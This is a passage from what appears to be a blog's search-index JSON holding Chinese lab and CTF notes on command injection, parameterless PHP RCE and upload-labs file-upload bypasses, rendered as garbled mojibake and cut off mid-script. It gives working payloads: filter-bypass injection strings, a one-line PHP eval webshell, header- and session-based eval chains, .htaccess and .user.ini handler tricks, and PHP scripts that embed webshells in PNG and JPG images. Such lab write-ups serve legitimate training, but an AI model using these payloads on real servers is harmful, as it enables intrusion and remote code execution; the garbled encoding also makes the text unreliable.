ç”¨system(\u0026lsquo;ipconfig\u0026rsquo;)æˆ–è€…phpinfo()æµ‹è¯•\nDVWAçš„RCE low è·Ÿpikachuä¸€æ ·ç›´æ¥åŠ \u0026amp;\nmedium å› ä¸ºå¹³å°æ˜¯Windowsï¼Œè€Œé¶åœºè¿‡æ»¤çš„æ˜¯Linuxè¿æ¥ç¬¦ï¼Œæ‰€ä»¥è·Ÿä¸Šé¢ä¸€æ ·\nhigh æŸ¥çœ‹æºç ç®¡é“ç¬¦|åæœ‰ç©ºæ ¼\næˆ‘ä»¬ä¸åŠ ç©ºæ ¼ç›´æ¥æ‹¼æ¥\nctfhubç»ƒä¹  evalæ‰§è¡Œ èšå‰‘è¿æ¥ï¼Œå³é”®æ‰“å¼€ç»ˆç«¯\nç„¶åls /æ ¹ç›®å½•ä¸‹å°±æœ‰flag\nå‘½ä»¤æ³¨å…¥-æ— è¿‡æ»¤ è¦æ±‚è¾“å…¥ip,æ²¡æœ‰è¿‡æ»¤\nç›´æ¥è¾“å…¥127.0.0.1;lsæŸ¥çœ‹ç›®å½•ä¸‹æ–‡ä»¶\næœ‰ä¸€ä¸ªphpæ–‡ä»¶ï¼ŒcatæŸ¥çœ‹æ²¡ä¸œè¥¿\nç›´æ¥è½¬base64ç¼–ç \n1 127.0.0.1;cat xxx.php|base64 ç„¶åè§£ç å¾—åˆ°flag\nå‘½ä»¤æ³¨å…¥-è¿‡æ»¤cat æ”¹ä¸ºlesså°±è¡Œäº†\nå…¶ä»–å‘½ä»¤\n1 2 3 4 5 6 7 8 cat ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º tac ä»æœ€åä¸€è¡Œå€’åºæ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡º more æ ¹æ®çª—å£å¤§å°ï¼Œä¸€é¡µä¸€é¡µçš„ç°å®æ–‡ä»¶å†…å®¹ less å’Œmoreç±»ä¼¼ï¼Œä½†å…¶ä¼˜ç‚¹å¯ä»¥å¾€å‰ç¿»é¡µï¼Œè€Œä¸”è¿›è¡Œå¯ä»¥æœç´¢å­—ç¬¦ head åªæ˜¾ç¤ºå¤´å‡ è¡Œ tail åªæ˜¾ç¤ºæœ€åå‡ è¡Œ nl ç±»ä¼¼äºcat -nï¼Œæ˜¾ç¤ºæ—¶è¾“å‡ºè¡Œå· tailf ç±»ä¼¼äºtail -f å‘½ä»¤æ³¨å…¥-è¿‡æ»¤ç©ºæ ¼ 1 ä½¿ç”¨$IFS$9ã€%09ã€\u0026lt;ã€\u0026gt;ã€\u0026lt;\u0026gt;ã€{,}ã€%20ã€${IFS}ã€${IFS}æ¥ä»£æ›¿ç©ºæ ¼ å‘½ä»¤æ³¨å…¥-è¿‡æ»¤å‘½ä»¤åˆ†éš”ç¬¦ cdè·³ç›®å½•å†catï¼Œæˆ–è€…%0aä»£æ›¿ç›®å½•åˆ†éš”ç¬¦/(åœ¨urlé‡Œé¢è¾“å…¥)\nè¿‡æ»¤è¿ç®—ç¬¦ å…¶å®å‰é¢è¦base64æ˜¯å› ä¸ºæºç è¢«æ³¨é‡Šäº†\næ‰€ä»¥æˆ‘ä»¬æ­£å¸¸cat flagç„¶åæŸ¥çœ‹æºç \nç»¼åˆè¿‡æ»¤ flagè¿‡æ»¤ç”¨f***ç»•è¿‡\ncatæ”¹ä¸ºmore\n;ç”¨%0a\nç„¶åè·Ÿä¸Šé¢ä¸€æ ·æ„é€ payloadåˆ°urlé‡Œé¢\n1 127.0.0.1%0acd${IFS}f***_is_here${IFS}%0amore${IFS}f***_61177426640.php é˜²å¾¡ 1ã€å°½é‡ä¸è¦ä½¿ç”¨å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°\n2ã€å¦‚æœå¿…é¡»ä½¿ç”¨ï¼Œéœ€è¦åšç™½åå•å¤„ç†\n3ã€ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹è¿›è¡Œå¤„ç†\n4ã€ä½¿ç”¨WAF\n","date":"2024-10-10T00:00:00Z","image":"https://0d000721999.github.io/p/rce/1.jpg","permalink":"https://0d000721999.github.io/p/rce/","title":"RCE"},{"content":"æ— å‚rce 1ã€getallheaders() getallheaders()è¿”å›æ‰€æœ‰çš„HTTPå¤´ä¿¡æ¯ï¼Œä½†æ˜¯è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯è¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè€Œeval()è¦æ±‚çš„å‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¿™é‡Œä¸èƒ½ç›´æ¥ç”¨ï¼Œè¿™æ—¶æˆ‘ä»¬å°±è¦æƒ³åŠæ³•å°†æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚æ­£å¥½implode()è¿™ä¸ªå‡½æ•°å°±èƒ½èƒœä»»ã€‚\nimplode()èƒ½å¤Ÿç›´æ¥å°†getallheaders()è¿”å›çš„æ•°ç»„è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ã€‚\nå¯ä»¥çœ‹åˆ°è·å–åˆ°çš„å¤´ä¿¡æ¯è¢«å½“ä½œå­—ç¬¦ä¸²è¾“å‡ºäº†ï¼Œä¸”æ˜¯ä»æœ€åå¼€å§‹è¾“å‡º(ç”±äºphpç‰ˆæœ¬ä¸åŒï¼Œè¾“å‡ºé¡ºåºä¹Ÿå¯èƒ½ä¸åŒ)ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨æœ€åéšæ„æ·»åŠ ä¸€ä¸ªå¤´ï¼Œæ’å…¥æˆ‘ä»¬çš„æ¶æ„ä»£ç å¹¶å°†åé¢çš„å†…å®¹æ³¨é‡Šæ‰ã€‚\n1 ?exp=eval(implode(getallheaders())); 2ã€get_defined_vars() è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯è·å–æ‰€æœ‰çš„å·²å®šä¹‰å˜é‡ï¼Œè¿”å›å€¼ä¹Ÿæ˜¯æ•°ç»„ã€‚ä¸è¿‡è¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥ä¸èƒ½ä¸implodeç»“åˆèµ·æ¥ç”¨ã€‚è¦ç”¨var_dump()è¾“å‡º\nç”¨GETä¼ å…¥çš„å‚æ•°ä¼šè¢«æ˜¾ç¤ºåœ¨æ•°ç»„ä¸­çš„ç¬¬ä¸€ä½\nè¦è¿”å›æ•°ç»„çš„ç¬¬ä¸€ä¸ªå€¼è¦ç”¨current()å‡½æ•°å¯ä»¥è¿”å›æ•°ç»„ä¸­çš„å•å…ƒä¸”åˆå§‹æŒ‡é’ˆæŒ‡å‘æ•°ç»„çš„ç¬¬ä¸€ä¸ªå•å…ƒã€‚å› ä¸ºGETæ–¹å¼ä¼ å…¥çš„å‚æ•°å­˜åœ¨è¯¥äºŒç»´æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°å°†å…¶å–å‡ºæ¥\n1 var_dump(current(get_defined_vars())); å¦‚æœæˆ‘ä»¬ä¼ å€¼æ˜¯è¿™æ ·ï¼š\n1 ?get=a\u0026amp;shell=phpinfo(); åé¢ä¼ å…¥çš„shell=phpinfo();å‡ºç°åœ¨äº†ç¬¬ä¸€ä¸ªæ•°ç»„çš„æœ€åã€‚\nend()å‡½æ•°å¯ä»¥å€’åºï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å°†å‘½ä»¤å†™åˆ°åé¢çš„å‚æ•°å†è°ƒç”¨å‡½æ•°ï¼Œæ‰§è¡Œshellå‘½ä»¤\n1 ?exp=eval(end(current(get_defined_vars())));\u0026amp;shell=phpinfo(); 3ã€session_id() session_id()å¯ä»¥ç”¨æ¥è·å–/è®¾ç½®å½“å‰ä¼šè¯ IDã€‚ é‚£ä¹ˆå¯ä»¥ç”¨è¿™ä¸ªå‡½æ•°æ¥è·å–cookieä¸­çš„phpsessionidäº†ï¼Œå¹¶ä¸”è¿™ä¸ªå€¼æˆ‘ä»¬æ˜¯å¯æ§çš„\næ–‡ä»¶ä¼šè¯ç®¡ç†å™¨ä»…å…è®¸ä¼šè¯ ID ä¸­ä½¿ç”¨ä»¥ä¸‹å­—ç¬¦ï¼ša-z A-Z 0-9 ,ï¼ˆé€—å·ï¼‰å’Œ - ï¼ˆå‡å·)\nè§£å†³æ–¹æ³•ï¼šå°†å‚æ•°è½¬åŒ–ä¸º16è¿›åˆ¶ä¼ è¿›å»ï¼Œä¹‹åå†ç”¨hex2bin()å‡½æ•°è½¬æ¢å›æ¥å°±å¯ä»¥äº†ã€‚\n1 2 ?exp=eval(hex2bin(session_id(session_start()))); æˆ–è€…?exp=eval(session_start();system(hex2bin(session_id()))); æ‰§è¡Œçš„å‘½ä»¤bpå†™å…¥16è¿›åˆ¶è§£æ\n1 hex(\u0026#34;phpinfo();\u0026#34;)=706870696e666f28293b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 getchwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚ scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚ dirname() å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚ chdir() å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚ readfile() è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚ current() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ã€‚ pos() current() çš„åˆ«åã€‚ next() å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ end() å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ array_rand() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚ array_flip() array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚ array_slice() å‡½æ•°åœ¨æ•°ç»„ä¸­æ ¹æ®æ¡ä»¶å–å‡ºä¸€æ®µå€¼ï¼Œå¹¶è¿”å›ã€‚ array_reverse() å‡½æ•°è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ã€‚ chr() å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚ hex2bin() â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚ getenv() è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨7.1ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)ã€‚ localeconv() å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ã€‚ ","date":"2024-10-10T00:00:00Z","image":"https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/1.png","permalink":"https://0d000721999.github.io/p/%E6%97%A0%E5%8F%82rce/","title":"æ— å‚RCE"},{"content":"æ–‡ä»¶ä¸Šä¼  ä¸€å¥è¯æœ¨é©¬\n1 \u0026lt;?php @eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt; webshell https://github.com/tennc/webshell\nç½‘ç«™æ§åˆ¶å·¥å…· ä¸­å›½èœåˆ€ ä¸­å›½èšå‰‘ https://github.com/AntSwordProject/antSword\nweevely https://github.com/epinna/weevely3\nå“¥æ–¯æ‹‰godzila https://github.com/BeichenDream/Godzilla\nå†°è behinder https://github.com/rebeyond/Behinder\nweevely(kali) ç”Ÿæˆæœ¨é©¬\n1 weevely generate cmd weevely.php è¿æ¥\n1 weevely ip cmd å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†\nupload-labsé¶åœºç»ƒä¹  pass01 æç¤ºä¸è®©ä¸Šä¼ php,çŒœæµ‹æ˜¯å‰ç«¯éªŒè¯\nç¦ç”¨jsæˆ–è€…\næŒ‰ä¸‹ä¸Šä¼ è¦æ£€æµ‹ï¼Œæˆ‘ä»¬ç›´æ¥åˆ æ‰onsubmit\nä¸Šä¼ ç›´æ¥èšå‰‘è¿æ¥\npass02 æç¤ºå¯¹æ•°æ®åŒ…çš„MIMEæ£€æŸ¥\nMIME Multipurpose Internet Mail Extensions\nå¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹\nå®¢æˆ·ç«¯ä½¿ç”¨ï¼š\n1ã€GETè¯·æ±‚ä¸éœ€è¦è¿™ä¸ªå­—æ®µã€‚\n2ã€POSTè¯·æ±‚å¤´ï¼Œæ”¾åœ¨Content Typeå­—æ®µç”¨æ¥æŒ‡å®šä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ï¼Œæ–¹ä¾¿æœåŠ¡å™¨è§£æã€‚æ”¾åœ¨Acceptï¼Œå‘Šè¯‰æœåŠ¡ç«¯å…è®¸æ¥æ”¶çš„å“åº”ç±»å‹ã€‚æ¯”å¦‚åªèƒ½æ¥æ”¶jsonæˆ–è€…å…¶ä»–ã€‚\næœåŠ¡ç«¯ä½¿ç”¨ï¼š\næ”¾åœ¨å“åº”å¤´é‡Œé¢ï¼ŒContent Typeå‘Šè¯‰å®¢æˆ·ç«¯å“åº”çš„æ•°æ®ç±»å‹ï¼Œæ–¹ä¾¿å®¢æˆ·ç«¯è§£æã€‚\nå®˜æ–¹è§£é‡Šï¼šhttps://developermozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types\næ‰€ä»¥ç”¨bpæŠ“åŒ…ï¼Œåœ¨æˆ‘ä»¬ä¸Šä¼ çš„ä¸€å¥è¯æœ¨é©¬çš„content-typeä¸­ä¿®æ”¹æˆimage/jpegï¼Œå†æ”¾è¡Œ\nèšå‰‘è¿æ¥\npass03 é»‘åå•é‡Œé¢æœ‰php\nç­‰ä»·æ‹“å±•å é¦–å…ˆè¦ä¿®æ”¹apacheçš„é…ç½®\nåŠ ä¸Šä¸€è¡Œå°†åé¢è¿™äº›æ‹“å±•è¯†åˆ«æˆphp,ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸è¡Œ\næ¢ä¸€ç§æ–¹å¼ï¼ŒæŠŠåç¼€åæ”¹ä¸º.htaccessï¼Œä¹Ÿä¸è¡Œ\npass04 .htaccess .htaccess æ–‡ä»¶æ˜¯ Apache æœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½® ã€‚é€šè¿‡ .htaccess æ–‡ä»¶ï¼Œå¯ä»¥å®ç°ï¼šç½‘é¡µ 301 é‡å®šå‘ã€è‡ªå®šä¹‰404 é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½\nå…ˆä¸Šä¼ å›¾ç‰‡ï¼ˆshell.phpæ”¹åç¼€ä¸ºjpg)ç„¶åä¸Šä¼ .htaccess\n1 2 3 \u0026lt;FilesMatch \u0026#34;shell.jpg\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; æˆ–è€…\n1 AddType application/x-httpd-php .jpg 1 SetHandler application/x-httpd-php æŠŠå›¾ç‰‡åŒ¹é…ä¸ºphpä»£ç \npass05 æŸ¥çœ‹æç¤ºå­˜åœ¨readme.php\nphp.iniæ˜¯phpçš„ä¸€ä¸ªå…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ªwebæœåŠ¡èµ·ä½œç”¨\nè€Œ.user.iniå’Œ.htaccessä¸€æ ·æ˜¯ç›®å½•çš„é…ç½®æ–‡ä»¶ï¼Œ.user.iniå°±æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„php.ini\n1 2 3 4 5 .user.ini é…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªé…ç½®å¯ä»¥èµ·åˆ°ä¸€äº›ä½œç”¨ æ–¹æ³•ä¸€ï¼š auto_prepend_file = \u0026lt;filename\u0026gt; //åŒ…å«åœ¨æ–‡ä»¶å¤´ æ–¹æ³•äºŒï¼š auto_append_file = \u0026lt;filename\u0026gt; //åŒ…å«åœ¨æ–‡ä»¶å°¾ ä¸Šä¼ è¦æ”¹php.ini\nä¸‹é¢é‚£ä¸ªåŸæ¥æ˜¯300ç§’æˆ‘ä»¬æ”¹ä¸º10ç§’\né‡å¯æœåŠ¡å\nä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶\nèšå‰‘è¿æ¥çš„æ–‡ä»¶è¦æ”¹ä¸ºreadme.php\nä¹Ÿå¯ä»¥ç”¨ php. . ç‚¹ç©ºæ ¼ç‚¹ ç»•è¿‡ä¸Šä¼ \npass06 å¤§å°å†™è¿‡æ»¤ä¸å…¨ï¼Œç”¨PHPå°±èƒ½ä¸Šä¼ \npass07 æ²¡æœ‰è¿‡æ»¤ç©ºæ ¼ï¼ŒæŠ“åŒ…ååœ¨bpé‡Œé¢æŠŠæ–‡ä»¶åç¼€åŠ ç©ºæ ¼æ”¾è¡Œ\nç„¶åå°±è¿æ¥ä¸Šäº†\npass08 æŠ“åŒ…æ”¹ä¸º.php.\npass09 åç¼€åæœªåšå»::$DATAå¤„ç†\n1 Windowsç³»ç»Ÿä¸‹ï¼Œå¦‚æœä¸Šä¼ çš„æ–‡ä»¶åä¸º`9.php::$DATA`ä¼šåœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆä¸€ä¸ª9.phpçš„æ–‡ä»¶ï¼Œå…¶å†…å®¹å’Œæ‰€ä¸Šä¼ æ–‡ä»¶å†…å®¹ç›¸åŒå¹¶è¢«è§£æã€‚ è¿æ¥æ—¶è¦æŠŠ::$DATAå»æ‰\npass10 å› ä¸ºä¼šå»æ‰æœ«å°¾çš„ç‚¹å’Œå¤´å°¾ç©ºæ ¼\n.php. .ï¼ˆç‚¹ç©ºæ ¼ç‚¹ï¼‰\npass11 åç¼€é‡å†™ç»•è¿‡\n.pphphp\npass12 éœ€è¦phpçš„ç‰ˆæœ¬å·ä½äº5.3.29ï¼Œä¸”magic_quotes_gpcä¸ºå…³é—­çŠ¶æ€ï¼ˆéœ€è¦è‡ªå·±å…³é—­ï¼‰\nContent-Disposition ä½œä¸ºå¯¹ä¸‹è½½æ–‡ä»¶çš„ä¸€ä¸ªæ ‡è¯†å­—æ®µ\nå®˜æ–¹è§£é‡Šï¼šhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Disposition\næ–‡ä»¶åæˆªæ–­ æˆªæ–­å­—ç¬¦ï¼šchr(0) ï¼Œç±»ä¼¼äºC++çš„\u0026quot;\\0\u0026quot;\nåœ¨urlç¼–ç é‡Œé¢æ‰€ä»¥è¦è¾“å…¥%00\nä¸‹é¢é‚£é‡Œæ”¹æˆç¬¦åˆæ¡ä»¶çš„åç¼€åï¼Œä¸Šé¢ä¸Šä¼ è·¯å¾„å¡«å†™æˆ‘ä»¬çš„æœ¨é©¬ç„¶åç”¨%00æˆªæ–­\npass13 ç°åœ¨è·¯å¾„ä¸æ˜¯urlç¼–ç ï¼Œè¦ç”¨16è¿›åˆ¶ï¼Œå…ˆå†™ä¸ª+å ä½ï¼Œ+çš„16è¿›åˆ¶æ˜¯2b\nhexæ”¹ä¸º00\npass14 è¦ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œå¹¶ä¸”åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ¥å®ç°è¿è¡Œå›¾ç‰‡ä¸­çš„æœ¨é©¬\n1 2 3 4 5 6 7 8 9 10 è¡¥å……ï¼š Pngå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬8å­—èŠ‚ï¼š89 50 4E 47 0D 0A 1A 0Aã€‚å³ä¸º .PNG Jpgå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬2å­—èŠ‚ï¼šFF D8ã€‚ Gifå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬6å­—èŠ‚ï¼š47 49 46 38 39|37 61 ã€‚å³ä¸º GIF89(7)aã€‚ Bmpå›¾ç‰‡æ–‡ä»¶åŒ…æ‹¬2å­—èŠ‚ï¼š42 4Dã€‚å³ä¸º BM å›¾ç‰‡é©¬åˆ¶ä½œï¼š åœ¨cmdé‡Œæ‰§è¡Œ copy logo.jpg/b+test.php/a test.jpg logo.jpgä¸ºä»»æ„å›¾ç‰‡ï¼›test.php æ’å…¥çš„æœ¨é©¬æ–‡ä»¶ï¼›test.jpg ç”Ÿæˆçš„å›¾ç‰‡æœ¨é©¬ linuxé‡Œé¢ç”¨ cat logo.jpg shell.php\u0026gt;shell.jpg ä¸Šä¼ å®Œæˆå,åœ¨include.phpååŠ ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„\n1 http://upload-labs/include.php?file=upload/xxx.jpg pass15 è¿™é‡Œgetimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶\n1 2 getimagesize() å‡½æ•°ç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚ ä¸»è¦æ˜¯é’ˆå¯¹*.phpç›´æ¥æ›´æ”¹æ–‡ä»¶åç¼€ä¸ºå›¾ç‰‡åç¼€ï¼Œä¸Šä¸€é¢˜åˆ›å»ºçš„å›¾ç‰‡é©¬ä»ç„¶å¯ä»¥ä½¿ç”¨ã€‚ pass16 1 2 exif_imagetype()è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶åç¼€åã€‚ è¿”å›å€¼ä¸getimage()å‡½æ•°è¿”å›çš„ç´¢å¼•2ç›¸åŒï¼Œä½†æ˜¯é€Ÿåº¦æ¯”getimageå¿« è·Ÿ14ä¸€æ ·\npass17 é¢˜ç›®ç”¨äºŒæ¬¡æ¸²æŸ“æŠŠæˆ‘ä»¬å›¾ç‰‡é©¬é‡Œé¢çš„é©¬ç»™æ¸…é™¤äº†\ngifçš„è§£å†³åŠæ³•\nä¸Šä¼ å›¾ç‰‡ç„¶åä¸‹è½½å›æ˜¾å›¾ç‰‡\nç”¨010editorå¯¹æ¯”ï¼Œæ‰¾åˆ°ç›¸åŒçš„åœ°æ–¹ï¼ˆä¸Šä¼ å‰å’Œä¸Šä¼ åï¼Œä¸¤å¼ å›¾ç‰‡Hexä»ç„¶ä¿æŒä¸å˜çš„ä½ç½®ï¼‰å¹¶æ’å…¥æœ¨é©¬\næˆ‘ä»¬ç›´æ¥ç”¨ç°æˆçš„å›¾ç‰‡é©¬ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«ï¼Œè¿æ¥æˆåŠŸ\nå…¶ä»–å›¾ç‰‡æ ¼å¼çš„åŠæ³•å‚è€ƒupload-labsä¹‹pass 16è¯¦ç»†åˆ†æ - å…ˆçŸ¥ç¤¾åŒº\npngè„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y \u0026lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,\u0026#39;./1.png\u0026#39;); ?\u0026gt; ç”Ÿæˆçš„æœ¨é©¬æ˜¯\n1 \u0026lt;?$_GET[0]($_POST[1]);?\u0026gt; jpgè„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 \u0026lt;?php $miniPayload = \u0026#34;\u0026lt;?=phpinfo();?\u0026gt;\u0026#34;; if(!extension_loaded(\u0026#39;gd\u0026#39;) || !function_exists(\u0026#39;imagecreatefromjpeg\u0026#39;)) { die(\u0026#39;php-gd is not installed\u0026#39;); } if(!isset($argv[1])) { die(\u0026#39;php jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt;\u0026#39;); } set_error_handler(\u0026#34;custom_error_handler\u0026#34;); for($pad = 0; $pad \u0026lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-\u0026gt;readShort() != 0xFFD8) { die(\u0026#39;Incorrect SOI marker\u0026#39;); } while((!$dis-\u0026gt;eof()) \u0026amp;\u0026amp; ($dis-\u0026gt;readByte() == 0xFF)) { $marker = $dis-\u0026gt;readByte(); $size = $dis-\u0026gt;readShort() - 2; $dis-\u0026gt;skip($size); if($marker === 0xDA) { $startPos = $dis-\u0026gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(\u0026#39;_\u0026#39;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-\u0026gt;eof())) { if($dis-\u0026gt;readByte() === 0xFF) { if($dis-\u0026gt;readByte !== 0x00) { break; } } } $stopPos = $dis-\u0026gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(\u0026#39;payload_\u0026#39;.$argv[1], $outStream)) { die(\u0026#39;Success!\u0026#39;); } else { break; } } } } unlink(\u0026#39;payload_\u0026#39;.$argv[1]); die(\u0026#39;Something\\\u0026#39;s wrong\u0026#39;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(\u0026#39;/(\\d+) extraneous bytes before marker/\u0026#39;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-\u0026gt;binData = \u0026#39;\u0026#39;; $this-\u0026gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(\u0026#39;File not exists [\u0026#39;.$filename.\u0026#39;]\u0026#39;); $this-\u0026gt;binData = file_get_contents($filename); } else { $this-\u0026gt;binData = $filename; } $this-\u0026gt;size = strlen($this-\u0026gt;binData); } public function seek() { return ($this-\u0026gt;size - strlen($this-\u0026gt;binData)); } public function skip($skip) { $this-\u0026gt;binData = substr($this-\u0026gt;binData, $skip); } public function readByte() { 